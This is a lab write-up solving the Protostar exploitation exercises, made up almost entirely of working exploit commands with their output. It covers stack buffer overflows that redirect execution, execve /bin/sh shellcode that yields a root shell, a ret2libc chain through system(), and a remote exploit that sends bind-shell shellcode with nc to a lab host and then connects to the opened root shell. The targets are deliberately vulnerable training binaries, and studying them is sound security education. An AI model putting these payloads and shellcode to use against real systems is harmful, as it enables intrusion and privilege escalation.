# Lab8: Remote Code Execution

```bash
cd /opt/protostar/bin
```

## stack0

```bash
python -c 'print 65*"A"' | ./stack0
```

## stack1

```bash
./stack1 $(python -c 'print 64*"A"+"\x64\x63\x62\x61"')
```

## stack2

```bash
GREENIE=$(python -c 'print 64*"A"+"\x0a\x0d\x0a\x0d"')
export GREENIE
./stack2
```

## stack3

```bash
objdump stack3 -D | grep -A20 win
#08048424
python -c 'print 64*"A"+"\x24\x84\x04\x08"' | ./stack3
```

## stack4

```bash
objdump stack4 -D | grep -A20 win
#080483f4
python -c 'print 100*"\xf4\x83\x04\x08"' | ./stack4
```

## stack5
[shellcode](http://shell-storm.org/shellcode/files/shellcode-811.php)

```bash
gdb stack5
(gdb) break main
# Breakpoint 1 at 0x80483cd
(gdb) run
# Breakpoint 1, main (argc=1, argv=0xbffffc24)
(gdb) print $esp
# $1 = (void *) 0xbffffa30
(gdb) quit
python -c 'print 64*"A"' | ./stack5
python -c 'print 68*"A"' | ./stack5
python -c 'print 72*"A"' | ./stack5
python -c 'print 76*"A"' | ./stack5
# Segmentation fault

(python -c 'print 76*"A"+"\x00\xfc\xff\xbf"+400*"\x90"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; cat) | ./stack5
whoami
# root
id
# uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

## stack6

```bash
python -c 'print 64*"A"+16*"B"+"\x00\x00\x00\xbf"' | ./stack6
# input path please: bzzzt (0xbf000000)

gdb stack6
# set disassembly-flavor intel
# disas getpath
(gdb) break getpath
# Breakpoint 1 at 0x804848a
(gdb) run
# Breakpoint 1, getpath ()
(gdb) print system
# $1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) print exit
# $2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

(gdb) info proc mappings
# 0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
(gdb) find 0xb7e97000, +999999999, "/bin/sh"
# 0xb7fba23f
# warning: Unable to access target memory at 0xb7fd9647, halting search.
# 1 pattern found.

# using C code to obtain /bin/sh address
# gcc -o /tmp/stack6 /tmp/stack6.c
# /bin/sh: 0xb7fb63bf

(python -c 'print 64*"A"+16*"B"+"\xb0\xff\xec\xb7"+"\xc0\x60\xec\xb7"+"\xbf\x63\xfb\xb7"+"/usr/bin/id"'; cat) | ./stack6
whoami
# root
id
# uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

```C
#include <stdlib.h>
#include <stdio.h>

int main() {
   char *shell = "/bin/sh";
   char *p = (char *) 0xb7e97000;
 
   while (memcmp(++p, shell, sizeof(shell)));
   printf("%s: %p\n", shell, p);
 
   exit(0);
}
```

## final0
[shellcode](http://shell-storm.org/shellcode/files/shellcode-217.php)

```bash
python -c 'print 531*"A"' | nc 192.168.56.101 2995
# No such user AAAAAAAAAAAAAAA...
python -c 'print 532*"A"' | nc 192.168.56.101 2995
# 

python -c 'print "\r"+531*"\x90"+"\x90\xfc\xff\xbf"+100*"\x90"+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80\x89\xc7\x52\x66\x68\x7a\x69\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80"' | nc 192.168.56.101 2995

nc 192.168.56.101 31337
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```